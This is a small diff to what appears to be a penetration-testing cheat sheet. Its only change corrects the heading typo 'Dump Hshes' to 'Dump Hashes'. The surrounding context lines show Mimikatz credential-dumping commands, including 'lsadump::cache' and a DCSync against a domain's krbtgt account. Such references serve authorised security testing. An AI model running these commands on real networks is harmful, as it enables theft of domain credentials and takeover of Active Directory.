@@ -2906,7 +2906,7 @@ lsadump::cache
 lsadump::dcsync /<USERNAME>:<DOMAIN>\krbtgt /domain:<DOMAIN>
 ```
 
-##### Dump Hshes
+##### Dump Hashes
 
 ```c
 .\mimikatz.exe
